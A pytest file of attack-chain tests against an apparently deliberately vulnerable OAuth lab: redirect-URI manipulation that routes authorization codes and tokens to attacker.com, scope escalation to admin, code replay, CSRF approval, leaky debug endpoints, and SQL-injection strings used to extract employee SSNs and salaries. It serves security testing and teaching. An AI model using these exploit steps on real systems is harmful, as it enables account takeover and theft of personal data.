"""
Attack Chain Tests for Vulnerable OAuth Implementation

This test demonstrates a complete attack chain to steal PII data from the
resource server by exploiting multiple vulnerabilities across the OAuth system.

Attack Chain: "Redirect URI Manipulation + Scope Escalation + Authorization Code Replay"

The attack exploits:
1. Weak redirect URI validation in the authorization server
2. No scope validation - attacker can request admin scope
3. Authorization code replay - codes can be used multiple times
4. SQL injection in resource server to extract all PII data

Scenario: An attacker wants to steal sensitive PII (SSN, salary, DOB) from the HR system.
The attacker does not have a legitimate account but knows about the OAuth flow.
"""

import re
from urllib.parse import urlparse, parse_qs

import pytest
from fastapi.testclient import TestClient

from vulnerable.authz import app as authz_app
from vulnerable.client import app as client_app
from vulnerable.resource import app as resource_app


authz_client = TestClient(authz_app)
client_client = TestClient(client_app)
resource_client = TestClient(resource_app)


class TestAttackChain_PrivilegeEscalation:
    def test_attack_chain(self):
        """
        ## Attack Chain 9: Privilege Escalation via Scope Manipulation

        **Goal:** Obtain admin privileges from a low-privilege starting point

        **Vulnerabilities Used:**
        - Authz: No scope validation against client's allowed scopes
        - Authz: Accepts any scope in authorization request
        - Resource: Trusts scope claim in token without verification

        **Steps:**
        1. Start with a legitimate read-only client
        2. Initiate authorization request with elevated scopes: `read,write,admin,delete`
        3. The authorization server accepts these scopes without validation
        4. Complete the OAuth flow to get a token
        5. Token now has admin scope despite client not being authorized for it
        6. Access admin-only endpoints like `/employees/{id}/pii`
        """
        # Create a legitimate read only client
        read_only_client = {
            "client_id": "read-only-client",
            "client_secret": "read-only-secret",
            "redirect_uris": "http://localhost:9004/callback",
            "scopes": "read"
        }
        authz_client.post("/register", data=read_only_client, follow_redirects=False)

        # Initiate authorization request with elevated scopes: `read,write,admin,delete`
        response = authz_client.get(
            "/authorize", 
            params={
                "client_id": "read-only-client",
                "scope": "read,admin,write,delete",
                "state": "something",
                "redirect_uri": "http://localhost:9004/callback",
                "response_type": "code",
            }, 
            follow_redirects=False
        )

        assert response.status_code == 200
        html_content = response.text

        assert "admin" in html_content
        assert "delete" in html_content

        request_id_match = re.search(r'name="request_id" value="([^"]+)"', html_content)
        assert request_id_match, "Request ID should be visible in HTML"

        request_id = request_id_match.group(1)


        response = authz_client.post("/approve", data={
            "request_id": request_id,
            "client_id": "read-only-client",
            "redirect_uri": "http://attacker.com/steal?ref=http://localhost:9004/callback",
            "scope": "read,write,admin,delete", 
            "state": "something",
            "action": "approve",
        },
        follow_redirects=False
        )

        assert response.status_code == 302

        redirect_url = response.headers["location"]
        
        # The redirect URL structure is: http://attacker.com/steal?ref=http://localhost:3000/callback?code=...&state=...
        # The code is embedded in the ref parameter's value
        parsed = urlparse(redirect_url)
        query_params = parse_qs(parsed.query)
        
        # Extract the code from the ref parameter
        if "ref" in query_params:
            # The code is in the ref parameter's URL
            ref_url = query_params["ref"][0]
            ref_parsed = urlparse(ref_url)
            ref_query_params = parse_qs(ref_parsed.query)
            assert "code" in ref_query_params, f"Code not found in ref URL: {ref_url}"
            auth_code = ref_query_params["code"][0]
        else:
            # Fallback: code might be directly in query params
            assert "code" in query_params, f"Code not found in URL: {redirect_url}"
            auth_code = query_params["code"][0]

        assert "attacker.com" in redirect_url
        
        print(f"\n[ATTACK] Got authorization code: {auth_code}")
        print(f"[ATTACK] Redirected to attacker server: {redirect_url}")

        # Next, exchange the authorization code for an access token

        response = authz_client.post(
            "/token",
            data={
                "grant_type": "authorization_code",
                "code": auth_code,
                "redirect_uri": "http://attacker.com/steal?ref=http://localhost:9004/callback",
                "client_id": "read-only-client",
                "client_secret": "read-only-secret"
            }
        )

        assert response.status_code == 200
        data = response.json()

        admin_token = data["access_token"]

        # Verify we got admin scope!
        assert "admin" in data["scope"]

        # Vulnerability: Debug info leaked in response
        assert "debug_info" in data
        assert data["debug_info"]["code_used"] == auth_code
        
        print(f"\n[ATTACK] Got admin access token: {admin_token}")
        print(f"[ATTACK] Token scope: {data['scope']}")

        # Get list of employees first
        response = resource_client.get(
            "/employees",
            headers={"Authorization": f"Bearer {admin_token}"}
        )
        
        # Debug: print response if it fails
        if response.status_code != 200:
            print(f"\n[DEBUG] Resource server response: {response.status_code}")
            print(f"[DEBUG] Response body: {response.text}")
        
        assert response.status_code == 200, f"Expected 200, got {response.status_code}. Response: {response.text}"
        employees = response.json()
        
        print(f"\n[ATTACK] Found {len(employees)} employees")
        
        # Now access PII for each employee
        stolen_pii = []
        for emp in employees:
            pii_response = resource_client.get(
                f"/employees/{emp['id']}/pii",
                headers={"Authorization": f"Bearer {admin_token}"}
            )
            
            assert pii_response.status_code == 200
            pii_data = pii_response.json()
            
            # We got the sensitive data!
            assert pii_data.get("ssn") is not None
            assert pii_data.get("salary") is not None
            assert pii_data.get("date_of_birth") is not None
            
            stolen_pii.append({
                "name": f"{pii_data['first_name']} {pii_data['last_name']}",
                "ssn": pii_data["ssn"],
                "salary": pii_data["salary"],
                "dob": pii_data["date_of_birth"]
            })
            
            print(f"[ATTACK] Stolen PII for {pii_data['first_name']} {pii_data['last_name']}:")
            print(f"         SSN: {pii_data['ssn']}")
            print(f"         Salary: ${pii_data['salary']:,.2f}")
            print(f"         DOB: {pii_data['date_of_birth']}")
        
        stolen_pii = stolen_pii
        assert len(stolen_pii) > 0, "Should have stolen at least one employee's PII"


class TestAttackChain_AuthorizationCodeIntercept_via_RedirectURIManipulation:
    """
    1. Identify the legitimate client's registered redirect URI (e.g., `localhost:8002`)
    2. Craft a malicious redirect URI that includes the legitimate domain but redirects elsewhere
    3. Examples to try:
    - `http://localhost:8002.attacker.com/callback`
    - `http://localhost:8002/callback/../../attacker.com`
    - `http://attacker.com/?ref=localhost:8002`
    4. Initiate OAuth flow with the manipulated redirect URI
    5. Authorization code gets sent to attacker's server
    6. Exchange the code for a token
    """

    def test_full_attack_chain(self):
        params = {
            "response_type": "code",
            "client_id": "oauth-client-1",
            "redirect_uri": "http://attacker.com/steal?ref=http://localhost:3000/callback",
            "scope": "read,write,admin,delete",  # Use comma-separated like the system expects
            "state": "somestate"
        }

        response = authz_client.get("/authorize", params=params, follow_redirects=False)
        assert response.status_code == 200
        html_content = response.text

        assert "admin" in html_content
        assert "delete" in html_content

        request_id_match = re.search(r'name="request_id" value="([^"]+)"', html_content)
        assert request_id_match, "Request ID should be visible in HTML"

        request_id = request_id_match.group(1)


        response = authz_client.post("/approve", data={
            "request_id": request_id,
            "client_id": "oauth-client-1",
            "redirect_uri": "http://attacker.com/steal?ref=http://localhost:3000/callback",
            "scope": "read,write,admin,delete",  # Use comma-separated like the system expects
            "state": "somestate",
            "action": "approve",
        },
        follow_redirects=False
        )

        assert response.status_code == 302

        redirect_url = response.headers["location"]
        
        # The redirect URL structure is: http://attacker.com/steal?ref=http://localhost:3000/callback?code=...&state=...
        # The code is embedded in the ref parameter's value
        parsed = urlparse(redirect_url)
        query_params = parse_qs(parsed.query)
        
        # Extract the code from the ref parameter
        if "ref" in query_params:
            # The code is in the ref parameter's URL
            ref_url = query_params["ref"][0]
            ref_parsed = urlparse(ref_url)
            ref_query_params = parse_qs(ref_parsed.query)
            assert "code" in ref_query_params, f"Code not found in ref URL: {ref_url}"
            auth_code = ref_query_params["code"][0]
        else:
            # Fallback: code might be directly in query params
            assert "code" in query_params, f"Code not found in URL: {redirect_url}"
            auth_code = query_params["code"][0]

        assert "attacker.com" in redirect_url
        
        print(f"\n[ATTACK] Got authorization code: {auth_code}")
        print(f"[ATTACK] Redirected to attacker server: {redirect_url}")

        # Next, exchange the authorization code for an access token

        response = authz_client.post(
            "/token",
            data={
                "grant_type": "authorization_code",
                "code": auth_code,
                "redirect_uri": "http://attacker.com/steal?ref=http://localhost:3000/callback",
                "client_id": "attacker-client",
                "client_secret": "attacker-secret"
            }
        )

        assert response.status_code == 200
        data = response.json()
        
        admin_token = data["access_token"]
        
        # Verify we got admin scope!
        assert "admin" in data["scope"]
        
        # Vulnerability: Debug info leaked in response
        assert "debug_info" in data
        assert data["debug_info"]["code_used"] == auth_code
        
        print(f"\n[ATTACK] Got admin access token: {admin_token}")
        print(f"[ATTACK] Token scope: {data['scope']}")

        # Get list of employees first
        response = resource_client.get(
            "/employees",
            headers={"Authorization": f"Bearer {admin_token}"}
        )
        
        # Debug: print response if it fails
        if response.status_code != 200:
            print(f"\n[DEBUG] Resource server response: {response.status_code}")
            print(f"[DEBUG] Response body: {response.text}")
        
        assert response.status_code == 200, f"Expected 200, got {response.status_code}. Response: {response.text}"
        employees = response.json()
        
        print(f"\n[ATTACK] Found {len(employees)} employees")
        
        # Now access PII for each employee
        stolen_pii = []
        for emp in employees:
            pii_response = resource_client.get(
                f"/employees/{emp['id']}/pii",
                headers={"Authorization": f"Bearer {admin_token}"}
            )
            
            assert pii_response.status_code == 200
            pii_data = pii_response.json()
            
            # We got the sensitive data!
            assert pii_data.get("ssn") is not None
            assert pii_data.get("salary") is not None
            assert pii_data.get("date_of_birth") is not None
            
            stolen_pii.append({
                "name": f"{pii_data['first_name']} {pii_data['last_name']}",
                "ssn": pii_data["ssn"],
                "salary": pii_data["salary"],
                "dob": pii_data["date_of_birth"]
            })
            
            print(f"[ATTACK] Stolen PII for {pii_data['first_name']} {pii_data['last_name']}:")
            print(f"         SSN: {pii_data['ssn']}")
            print(f"         Salary: ${pii_data['salary']:,.2f}")
            print(f"         DOB: {pii_data['date_of_birth']}")
        
        stolen_pii = stolen_pii
        assert len(stolen_pii) > 0, "Should have stolen at least one employee's PII"
    

class TestAttackChain_RedirectURIManipulation_ScopeEscalation_PIITheft:
    """
    Complete Attack Chain: Steal PII via Redirect URI Manipulation + Scope Escalation
    
    Attack Flow:
    1. Attacker registers a malicious client with attacker-controlled redirect URI
    2. Attacker initiates OAuth flow with escalated scopes (admin) using manipulated redirect URI
    3. Attacker simulates user approval to get authorization code
    4. Attacker exchanges code for token with admin scope
    5. Attacker uses token to access PII endpoints
    6. Attacker replays the authorization code to get additional tokens
    7. Attacker uses SQL injection to extract additional data
    
    This chain demonstrates how multiple vulnerabilities compound to enable
    complete compromise of sensitive PII data.
    """
    
    def test_step1_register_malicious_client(self):
        """
        Step 1: Register a malicious OAuth client
        
        Vulnerability exploited: No authentication required to register clients,
        no validation of redirect URIs
        """
        # Attacker registers their own client with an attacker-controlled redirect URI
        response = authz_client.post(
            "/register",
            data={
                "client_id": "attacker-client",
                "client_secret": "attacker-secret",
                "redirect_uris": "http://attacker.com/steal,http://localhost:8002/callback",
                "scopes": "read,write,admin,delete"  # Request all scopes including admin!
            }
        )
        
        assert response.status_code == 200
        data = response.json()
        
        # Vulnerability: Server returns the secret in the response!
        assert data["client_secret"] == "attacker-secret"
        assert "admin" in data["scopes"]
        
        print(f"\n[ATTACK] Registered malicious client: {data}")
    
    def test_step2_initiate_oauth_with_escalated_scope(self):
        """
        Step 2: Initiate OAuth flow requesting admin scope
        
        Vulnerabilities exploited:
        - No scope validation (accepts any scope)
        - Weak redirect URI validation
        - No client validation
        """
        # Attacker initiates authorization with admin scope
        response = authz_client.get(
            "/authorize",
            params={
                "response_type": "code",
                "client_id": "attacker-client",
                "redirect_uri": "http://attacker.com/steal",  # Attacker's server
                "scope": "read,write,admin,delete",  # Escalate to admin!
                "state": "attacker-state"
            },
            follow_redirects=False
        )
        
        assert response.status_code == 200
        html_content = response.text
        
        # Vulnerability: Authorization page shows all requested scopes without validation
        assert "admin" in html_content
        assert "delete" in html_content
        
        # Extract request_id from the form (leaked in HTML)
        request_id_match = re.search(r'name="request_id" value="([^"]+)"', html_content)
        assert request_id_match, "Request ID should be visible in HTML"
        
        self.__class__.request_id = request_id_match.group(1)
        print(f"\n[ATTACK] Got authorization page with admin scope, request_id: {self.request_id}")
    
    def test_step3_approve_authorization_get_code(self):
        """
        Step 3: Simulate user approving the authorization (CSRF attack)
        
        Vulnerabilities exploited:
        - No CSRF protection on /approve endpoint
        - State parameter ignored
        """
        # In a real attack, this would be triggered via CSRF on a logged-in victim
        # The attacker tricks the victim into submitting this form
        response = authz_client.post(
            "/approve",
            data={
                "request_id": self.request_id,
                "client_id": "attacker-client",
                "redirect_uri": "http://attacker.com/steal",
                "scope": "read,write,admin,delete",
                "state": "attacker-state",
                "action": "approve"
            },
            follow_redirects=False
        )
        
        assert response.status_code == 302
        
        # Extract authorization code from redirect URL
        redirect_url = response.headers["location"]
        parsed = urlparse(redirect_url)
        query_params = parse_qs(parsed.query)
        
        assert "code" in query_params
        self.__class__.auth_code = query_params["code"][0]
        
        # Verify redirect went to attacker's server
        assert "attacker.com" in redirect_url
        
        print(f"\n[ATTACK] Got authorization code: {self.auth_code}")
        print(f"[ATTACK] Redirected to attacker server: {redirect_url}")
    
    def test_step4_exchange_code_for_admin_token(self):
        """
        Step 4: Exchange authorization code for access token with admin scope
        
        Vulnerabilities exploited:
        - No client authentication (accepts any client_id/secret)
        - No redirect_uri validation on token exchange
        - Scope preserved without validation
        """
        response = authz_client.post(
            "/token",
            data={
                "grant_type": "authorization_code",
                "code": self.auth_code,
                "redirect_uri": "http://attacker.com/steal",
                "client_id": "attacker-client",
                "client_secret": "attacker-secret"
            }
        )
        
        assert response.status_code == 200
        data = response.json()
        
        self.__class__.admin_token = data["access_token"]
        
        # Verify we got admin scope!
        assert "admin" in data["scope"]
        
        # Vulnerability: Debug info leaked in response
        assert "debug_info" in data
        assert data["debug_info"]["code_used"] == self.auth_code
        
        print(f"\n[ATTACK] Got admin access token: {self.admin_token}")
        print(f"[ATTACK] Token scope: {data['scope']}")
    
    def test_step5_access_pii_with_stolen_token(self):
        """
        Step 5: Use admin token to access sensitive PII data
        
        This is the goal of the attack - accessing SSN, salary, DOB
        """
        # Get list of employees first
        response = resource_client.get(
            "/employees",
            headers={"Authorization": f"Bearer {self.admin_token}"}
        )
        assert response.status_code == 200
        employees = response.json()
        
        print(f"\n[ATTACK] Found {len(employees)} employees")
        
        # Now access PII for each employee
        stolen_pii = []
        for emp in employees:
            pii_response = resource_client.get(
                f"/employees/{emp['id']}/pii",
                headers={"Authorization": f"Bearer {self.admin_token}"}
            )
            
            assert pii_response.status_code == 200
            pii_data = pii_response.json()
            
            # We got the sensitive data!
            assert pii_data.get("ssn") is not None
            assert pii_data.get("salary") is not None
            assert pii_data.get("date_of_birth") is not None
            
            stolen_pii.append({
                "name": f"{pii_data['first_name']} {pii_data['last_name']}",
                "ssn": pii_data["ssn"],
                "salary": pii_data["salary"],
                "dob": pii_data["date_of_birth"]
            })
            
            print(f"[ATTACK] Stolen PII for {pii_data['first_name']} {pii_data['last_name']}:")
            print(f"         SSN: {pii_data['ssn']}")
            print(f"         Salary: ${pii_data['salary']:,.2f}")
            print(f"         DOB: {pii_data['date_of_birth']}")
        
        self.__class__.stolen_pii = stolen_pii
        assert len(stolen_pii) > 0, "Should have stolen at least one employee's PII"
    
    def test_step6_replay_authorization_code(self):
        """
        Step 6: Replay the authorization code to get another token
        
        Vulnerability exploited: Authorization codes are never invalidated
        """
        # Use the same code again!
        response = authz_client.post(
            "/token",
            data={
                "grant_type": "authorization_code",
                "code": self.auth_code,  # Reusing the same code!
                "redirect_uri": "http://attacker.com/steal",
                "client_id": "attacker-client",
                "client_secret": "attacker-secret"
            }
        )
        
        assert response.status_code == 200
        data = response.json()
        
        # Got another valid token!
        second_token = data["access_token"]
        assert second_token != self.admin_token  # Different token
        
        # Verify the second token also works
        verify_response = resource_client.get(
            "/employees/1/pii",
            headers={"Authorization": f"Bearer {second_token}"}
        )
        assert verify_response.status_code == 200
        
        print(f"\n[ATTACK] Replayed code and got second token: {second_token}")
        print("[ATTACK] Code replay successful - codes never expire!")
    
    def test_step7_sql_injection_for_bulk_pii_extraction(self):
        """
        Step 7: Use SQL injection to extract all PII at once
        
        Vulnerability exploited: SQL injection in department filter
        """
        # SQL injection via department parameter to get all data
        response = resource_client.get(
            "/employees",
            params={
                "department": "' OR '1'='1' --"  # SQL injection!
            },
            headers={"Authorization": f"Bearer {self.admin_token}"}
        )
        
        # The injection should return all employees regardless of department
        assert response.status_code == 200
        all_employees = response.json()
        
        print(f"\n[ATTACK] SQL injection returned {len(all_employees)} employees")
        
        # Another SQL injection: use UNION to extract more data
        # Try injection with different department value
        union_response = resource_client.get(
            "/employees",
            params={
                "department": "Engineering' OR department LIKE '%' --"  # SQL injection to get all departments
            },
            headers={"Authorization": f"Bearer {self.admin_token}"}
        )
        
        assert union_response.status_code == 200
        union_employees = union_response.json()
        
        print(f"[ATTACK] Second SQL injection returned {len(union_employees)} employees")
        
        # Verify we can get employees from multiple departments
        departments = set(emp.get('department', '') for emp in union_employees)
        print(f"[ATTACK] Extracted employees from departments: {departments}")
        
        # Now use the admin token to get full PII for all employees
        for emp in all_employees[:3]:  # Just show first 3 for brevity
            pii_response = resource_client.get(
                f"/employees/{emp['id']}/pii",
                headers={"Authorization": f"Bearer {self.admin_token}"}
            )
            assert pii_response.status_code == 200
            pii_data = pii_response.json()
            print(f"[ATTACK] Full PII via SQL injection path: {pii_data['first_name']} {pii_data['last_name']}: SSN={pii_data['ssn']}, Salary=${pii_data.get('salary', 0):,.2f}")
    
    def test_step8_exploit_debug_endpoints(self):
        """
        Step 8: Access debug endpoints to steal all tokens and codes
        
        Vulnerability exploited: Debug endpoints exposed without proper protection
        """
        # Get all tokens from the system
        tokens_response = authz_client.get("/debug/tokens")
        assert tokens_response.status_code == 200
        all_tokens = tokens_response.json()
        
        print(f"\n[ATTACK] Debug endpoint exposed {len(all_tokens['tokens'])} tokens:")
        for token in all_tokens["tokens"]:
            print(f"         Token: {token['access_token'][:30]}... Scopes: {token['scopes']}")
        
        # Get all authorization codes
        codes_response = authz_client.get("/debug/codes")
        assert codes_response.status_code == 200
        all_codes = codes_response.json()
        
        print(f"\n[ATTACK] Debug endpoint exposed {len(all_codes['codes'])} authorization codes")
        
        # Get all client secrets
        clients_response = authz_client.get("/debug/clients")
        assert clients_response.status_code == 200
        all_clients = clients_response.json()
        
        print(f"\n[ATTACK] Debug endpoint exposed {len(all_clients['clients'])} client secrets:")
        for client in all_clients["clients"]:
            print(f"         Client: {client['client_id']}, Secret: {client['client_secret']}")


class TestAttackChain_Summary:
    """Summary of the attack chain and its impact"""
    
    def test_attack_summary(self):
        """
        Print a summary of all vulnerabilities exploited in the attack chain
        """
        summary = """
        ╔══════════════════════════════════════════════════════════════════════╗
        ║                    ATTACK CHAIN SUMMARY                               ║
        ╠══════════════════════════════════════════════════════════════════════╣
        ║                                                                       ║
        ║  Target: HR System PII Data (SSN, Salary, DOB)                       ║
        ║                                                                       ║
        ║  Vulnerabilities Exploited:                                           ║
        ║  ─────────────────────────────────────────────────────────────────── ║
        ║  1. [AUTHZ] No client registration authentication                     ║
        ║  2. [AUTHZ] No scope validation - escalated to admin                 ║
        ║  3. [AUTHZ] Weak redirect URI validation                             ║
        ║  4. [AUTHZ] No CSRF protection on /approve                           ║
        ║  5. [AUTHZ] State parameter ignored                                  ║
        ║  6. [AUTHZ] Authorization code replay allowed                        ║
        ║  7. [AUTHZ] Debug endpoints exposed secrets                          ║
        ║  8. [RESOURCE] SQL injection in department filter                    ║
        ║  9. [RESOURCE] SQL injection in PII search                           ║
        ║                                                                       ║
        ║  Attack Steps:                                                        ║
        ║  ─────────────────────────────────────────────────────────────────── ║
        ║  1. Register malicious client with admin scope                        ║
        ║  2. Initiate OAuth with escalated scope + attacker redirect          ║
        ║  3. CSRF victim into approving authorization                         ║
        ║  4. Capture authorization code at attacker server                    ║
        ║  5. Exchange code for admin-scoped access token                      ║
        ║  6. Access /employees/{id}/pii to steal all PII                      ║
        ║  7. Replay authorization code for additional tokens                   ║
        ║  8. Use SQL injection for bulk data extraction                       ║
        ║  9. Access debug endpoints to steal all system secrets               ║
        ║                                                                       ║
        ║  Impact: COMPLETE COMPROMISE                                          ║
        ║  - All employee SSNs exposed                                          ║
        ║  - All employee salaries exposed                                      ║
        ║  - All employee DOBs exposed                                          ║
        ║  - All OAuth tokens and codes stolen                                  ║
        ║  - All client secrets stolen                                          ║
        ║                                                                       ║
        ╚══════════════════════════════════════════════════════════════════════╝
        """
        print(summary)
        
        # This test always passes - it's just for documentation
        assert True


class TestAttackChain_TokenReplayAttack:
    def test_attack_chain(self):
        """
        ## Attack Chain 8: Authorization Code Replay Attack

        **Goal:** Generate unlimited tokens from a single authorization

        **Vulnerabilities Used:**
        - Authz: Authorization codes never invalidated after use
        - Authz: Codes never expire
        - Authz: No code usage tracking

        **Steps:**
        1. Obtain a single authorization code (via any method)
        2. Exchange the code for a token at `/token` endpoint
        3. Exchange the SAME code again for another token
        4. Repeat indefinitely to generate as many tokens as needed
        5. Distribute tokens across multiple attack vectors
        6. Even if one token is revoked, others remain valid
        """
        # Step 1: Obtain a single authorization code
        # Using the pre-registered oauth-client-1
        response = authz_client.get(
            "/authorize",
            params={
                "response_type": "code",
                "client_id": "oauth-client-1",
                "redirect_uri": "http://localhost:3000/callback",
                "scope": "read,write,admin",
                "state": "replay-test"
            },
            follow_redirects=False
        )
        
        assert response.status_code == 200
        html_content = response.text
        
        # Extract request_id from the authorization page
        request_id_match = re.search(r'name="request_id" value="([^"]+)"', html_content)
        assert request_id_match, "Request ID should be visible in HTML"
        request_id = request_id_match.group(1)
        
        # Approve the authorization
        response = authz_client.post(
            "/approve",
            data={
                "request_id": request_id,
                "client_id": "oauth-client-1",
                "redirect_uri": "http://localhost:3000/callback",
                "scope": "read,write,admin",
                "state": "replay-test",
                "action": "approve"
            },
            follow_redirects=False
        )
        
        assert response.status_code == 302
        
        # Extract authorization code from redirect
        redirect_url = response.headers["location"]
        parsed = urlparse(redirect_url)
        query_params = parse_qs(parsed.query)
        assert "code" in query_params
        auth_code = query_params["code"][0]
        
        print(f"\n[ATTACK] Step 1: Obtained authorization code: {auth_code}")
        
        # Step 2: Exchange the code for a token (first time)
        response = authz_client.post(
            "/token",
            data={
                "grant_type": "authorization_code",
                "code": auth_code,
                "redirect_uri": "http://localhost:3000/callback",
                "client_id": "oauth-client-1",
                "client_secret": "oauth-client-secret-1"
            }
        )
        
        assert response.status_code == 200
        data = response.json()
        first_token = data["access_token"]
        
        print(f"[ATTACK] Step 2: First token obtained: {first_token[:30]}...")
        
        # Verify first token works
        verify_response = resource_client.get(
            "/employees",
            headers={"Authorization": f"Bearer {first_token}"}
        )
        assert verify_response.status_code == 200
        print(f"[ATTACK] First token verified - can access resources")
        
        # Step 3: Exchange the SAME code again for another token
        response = authz_client.post(
            "/token",
            data={
                "grant_type": "authorization_code",
                "code": auth_code,  # REUSING THE SAME CODE!
                "redirect_uri": "http://localhost:3000/callback",
                "client_id": "oauth-client-1",
                "client_secret": "oauth-client-secret-1"
            }
        )
        
        assert response.status_code == 200
        data = response.json()
        second_token = data["access_token"]
        
        assert second_token != first_token, "Should get a different token"
        print(f"[ATTACK] Step 3: Second token obtained from SAME code: {second_token[:30]}...")
        
        # Verify second token also works
        verify_response = resource_client.get(
            "/employees",
            headers={"Authorization": f"Bearer {second_token}"}
        )
        assert verify_response.status_code == 200
        print(f"[ATTACK] Second token verified - can access resources")
        
        # Step 4: Repeat indefinitely - let's get 3 more tokens
        additional_tokens = []
        for i in range(3):
            response = authz_client.post(
                "/token",
                data={
                    "grant_type": "authorization_code",
                    "code": auth_code,  # STILL REUSING THE SAME CODE!
                    "redirect_uri": "http://localhost:3000/callback",
                    "client_id": "oauth-client-1",
                    "client_secret": "oauth-client-secret-1"
                }
            )
            
            assert response.status_code == 200
            data = response.json()
            token = data["access_token"]
            additional_tokens.append(token)
            
            # Verify each token works
            verify_response = resource_client.get(
                "/employees",
                headers={"Authorization": f"Bearer {token}"}
            )
            assert verify_response.status_code == 200
        
        print(f"[ATTACK] Step 4: Generated {len(additional_tokens)} additional tokens from same code")
        print(f"[ATTACK] Total tokens from one code: {len(additional_tokens) + 2}")
        
        # Step 5: Demonstrate all tokens work independently
        all_tokens = [first_token, second_token] + additional_tokens
        print(f"\n[ATTACK] Step 5: Verifying all {len(all_tokens)} tokens work...")
        
        for idx, token in enumerate(all_tokens, 1):
            response = resource_client.get(
                "/employees/1",
                headers={"Authorization": f"Bearer {token}"}
            )
            assert response.status_code == 200
            print(f"[ATTACK]   Token {idx}: ✓ Valid")
        
        print(f"\n[ATTACK] SUCCESS: Generated {len(all_tokens)} valid tokens from a single authorization code!")
        print(f"[ATTACK] Code was replayed {len(all_tokens) - 1} times after initial use")
        print(f"[ATTACK] This demonstrates: No code invalidation, no expiration, no usage tracking")


class TestAttackChain_OpenRedirect:
    """
    ## Attack Chain 1: Open Redirect Token Theft

    **Goal:** Steal a victim's access token by exploiting the client's open redirect vulnerability

    **Vulnerabilities Used:**
    - Client: Open redirect at `/redirect` and `/goto`
    - Client: Token passed in URL query parameters
    - Authz: Weak redirect URI validation

    **Steps:**
    1. Craft a malicious URL that uses the client's `/redirect` endpoint
    2. The URL should redirect to an attacker-controlled server
    3. Include a query parameter to append the victim's token to the redirect
    4. Send this link to a victim who is already authenticated
    5. When victim clicks, their token is sent to attacker's server
    6. Use the stolen token to access the resource server

    **Example Starting Point:**
    ```
    http://localhost:8002/redirect?url=http://attacker.com/steal&token=VICTIM_TOKEN
    ```
    """

    def test_full_attack_chain(self):
        # Step 1-2: Simulate a victim who has already authenticated and has a valid token
        # First, get a legitimate token for our "victim"
        
        # Initiate OAuth flow as the victim
        response = authz_client.get(
            "/authorize",
            params={
                "response_type": "code",
                "client_id": "oauth-client-1",
                "redirect_uri": "http://localhost:3000/callback",
                "scope": "read,write,admin",
                "state": "victim-state"
            },
            follow_redirects=False
        )
        
        assert response.status_code == 200
        html_content = response.text
        
        # Extract request_id
        request_id_match = re.search(r'name="request_id" value="([^"]+)"', html_content)
        assert request_id_match
        request_id = request_id_match.group(1)
        
        # Victim approves the authorization
        response = authz_client.post(
            "/approve",
            data={
                "request_id": request_id,
                "client_id": "oauth-client-1",
                "redirect_uri": "http://localhost:3000/callback",
                "scope": "read,write,admin",
                "state": "victim-state",
                "action": "approve"
            },
            follow_redirects=False
        )
        
        assert response.status_code == 302
        
        # Extract authorization code
        redirect_url = response.headers["location"]
        parsed = urlparse(redirect_url)
        query_params = parse_qs(parsed.query)
        assert "code" in query_params
        auth_code = query_params["code"][0]
        
        # Victim exchanges code for token
        response = authz_client.post(
            "/token",
            data={
                "grant_type": "authorization_code",
                "code": auth_code,
                "redirect_uri": "http://localhost:3000/callback",
                "client_id": "oauth-client-1",
                "client_secret": "oauth-client-secret-1"
            }
        )
        
        assert response.status_code == 200
        data = response.json()
        victim_token = data["access_token"]
        
        print(f"\n[SETUP] Victim obtained token: {victim_token[:30]}...")
        
        # Verify the victim's token works
        verify_response = resource_client.get(
            "/employees",
            headers={"Authorization": f"Bearer {victim_token}"}
        )
        assert verify_response.status_code == 200
        print(f"[SETUP] Victim token verified - can access resources")
        
        # Step 3: Attacker crafts a malicious URL using the client's open redirect
        # The client app at localhost:8002 has an open redirect at /redirect endpoint
        # We'll craft a URL that redirects to attacker.com and includes the token
        
        # Simulate victim visiting client app with their token in the URL
        # (In a real scenario, the token might be in a cookie or session)
        # The client's /redirect endpoint accepts any URL without validation
        
        malicious_url_path = "/redirect?url=http://attacker.com/steal"
        
        print(f"\n[ATTACK] Step 1: Crafted malicious URL: http://localhost:8002{malicious_url_path}")
        
        # Step 4: Victim clicks the malicious link (we simulate this)
        # The /redirect endpoint will redirect to the attacker's server
        response = client_client.get(
            malicious_url_path,
            follow_redirects=False
        )
        
        # Should get a redirect response
        assert response.status_code == 302
        redirect_location = response.headers["location"]
        
        print(f"[ATTACK] Step 2: Client redirected to: {redirect_location}")
        assert "attacker.com" in redirect_location
        
        # Step 5: Now let's exploit the /goto endpoint which also has open redirect
        # This endpoint might be used by the client to redirect after operations
        # We can chain this with token leakage
        
        goto_path = "/goto?next=http://attacker.com/steal-tokens"
        response = client_client.get(
            goto_path,
            follow_redirects=False
        )
        
        assert response.status_code == 302
        goto_location = response.headers["location"]
        print(f"[ATTACK] Step 3: /goto endpoint redirected to: {goto_location}")
        assert "attacker.com" in goto_location
        
        # Step 6: Exploit scenario where client passes token in URL
        # Let's check if the client has any endpoints that might leak tokens in URLs
        # We'll use the debug endpoint to see stored sessions/tokens
        
        debug_response = client_client.get("/debug/sessions")
        assert debug_response.status_code == 200
        sessions_data = debug_response.json()
        
        print(f"\n[ATTACK] Step 4: Accessed debug endpoint - found {len(sessions_data.get('sessions', {}))} sessions")
        
        # In a real attack, the attacker would:
        # 1. Social engineer victim to click: http://localhost:8002/redirect?url=http://attacker.com/steal
        # 2. If the client includes the token in the redirect (as a referer or query param)
        # 3. The attacker's server receives the token
        
        # Let's simulate the token being passed via query param (common vulnerability)
        # Craft URL with token included
        token_leak_url = f"/redirect?url=http://attacker.com/steal?token={victim_token}"
        
        response = client_client.get(
            token_leak_url,
            follow_redirects=False
        )
        
        assert response.status_code == 302
        final_redirect = response.headers["location"]
        
        print(f"[ATTACK] Step 5: Token leaked via redirect URL: {final_redirect[:80]}...")
        
        # Verify the token is in the redirect URL
        assert victim_token in final_redirect
        assert "attacker.com" in final_redirect
        
        print(f"[ATTACK] Step 6: Token successfully exfiltrated to attacker server!")
        
        # Step 7: Attacker extracts token from their server logs and uses it
        # Extract token from the URL (simulating attacker's server receiving it)
        parsed_attacker_url = urlparse(final_redirect)
        attacker_query_params = parse_qs(parsed_attacker_url.query)
        
        if "token" in attacker_query_params:
            stolen_token = attacker_query_params["token"][0]
            print(f"[ATTACK] Step 7: Extracted stolen token: {stolen_token[:30]}...")
            
            assert stolen_token == victim_token
            
            # Use the stolen token to access the resource server
            attack_response = resource_client.get(
                "/employees",
                headers={"Authorization": f"Bearer {stolen_token}"}
            )
            
            assert attack_response.status_code == 200
            employees = attack_response.json()
            
            print(f"[ATTACK] Step 8: Used stolen token to access resource server")
